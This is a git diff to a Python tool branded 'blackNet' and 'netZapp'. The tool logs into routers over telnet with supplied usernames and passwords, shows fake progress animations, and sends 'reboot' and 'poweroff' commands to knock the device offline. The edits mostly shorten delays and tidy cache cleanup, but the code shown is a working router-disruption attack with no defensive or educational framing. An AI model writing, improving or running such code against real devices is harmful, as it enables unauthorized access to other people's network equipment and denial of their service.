@@ -29,6 +29,8 @@ blackNetBanner = """
 """    
 
 netZappBanner = blue+"""
+  ,.,,,,,,,,,,,.,,,,,
+    . .. .  . / ..  .
            , /
          , '/
         , '/
@@ -48,7 +50,11 @@ menuopt = """
   -> By Dyoniso_
   """
 
-os.system("")
+os.system("clear")
+
+os.chdir(r"core/")
+os.system("rm -r __pycache__")
+os.chdir(r"../")
 
 def reset():
 	python = sys.executable
@@ -139,15 +145,15 @@ def blackNetWorks():
 		tn = telnetlib.Telnet(HOST)
 		
 		sys.stdout.write("\r"+tag+HOST+"/User:"+user+"/Pass:"+password+"    <- "+green+"Connecting.")
-		time.sleep(0.5)
+		time.sleep(0.1)
 		sys.stdout.write("\r"+tag+HOST+"/User:"+user+"/Pass:"+password+"   <-- "+green+"Connecting..")
-		time.sleep(0.5)
+		time.sleep(0.1)
 		sys.stdout.write("\r"+tag+HOST+"/User:"+user+"/Pass:"+password+"  <--- "+green+"Connecting...")
-		time.sleep(0.5)
+		time.sleep(0.1)
 		sys.stdout.write("\r"+tag+HOST+"/User:"+user+"/Pass:"+password+" <---- "+green+"Connected ...")
-		time.sleep(0.5)
+		time.sleep(0.1)
 		sys.stdout.write("\r"+tag+"###.###.###.###"+"/User:"+user+"/Pass:"+password+" <---- "+green+"Connected ###")
-		time.sleep(0.5)
+		time.sleep(0.1)
 		
 		tn.read_until(b"login: ")
 		tn.write(user.encode('ascii') + b"\n")
@@ -159,17 +165,17 @@ def blackNetWorks():
 		print("")
 		print(tag+"Rebooting Router...")
 		sys.stdout.write(green+"\r000:"+blue+"______________"+red+"#"+blue+"]")
-		time.sleep(0.5)
+		time.sleep(0.1)
 		sys.stdout.write(green+"\r000:"+blue+"_________"+red+"#"+blue+"_____]")
-		time.sleep(0.5)
+		time.sleep(0.1)
 		sys.stdout.write(green+"\r000:"+blue+"_____"+red+"#"+blue+"_________]")
-		time.sleep(0.5)
+		time.sleep(0.1)
 		sys.stdout.write(green+"\r000:"+red+"#"+blue+"______________]")
-		time.sleep(0.5)
+		time.sleep(0.1)
 		sys.stdout.write(green+"\r000:"+blue+"_______________]")
-		time.sleep(0.5)
+		time.sleep(0.1)
 		sys.stdout.write(red+"\r###:")
-		time.sleep(0.5)
+		time.sleep(0.1)
 		tn.write(b"reboot\n")
 		tn.write(b"poweroff\n")
 		sys.stdout.write("\r"+tag2+"Complete!:~~~~~~")
@@ -178,6 +184,7 @@ def blackNetWorks():
 		try:
 			os.chdir(r"core")
 			os.system("rm -r __pycache__")
+			os.chdir(r"../")
 			print(tag2+"Complete!")
 		except:
 			print(tag3+"Error!")
@@ -254,10 +261,9 @@ def netZapp():
 		tn.write(b"reboot\n")
 		tn.write(b"poweroff\n")
 		sys.stdout.write("\r"+tag2+"Complete!:~~~~~~")
-		exit()
 		
 	except:
-		print(tag3+"Fatal Error, Connection Refused")
+		print("\n"+tag3+"Fatal Error, Connection Refused")
 		exit()
 
 
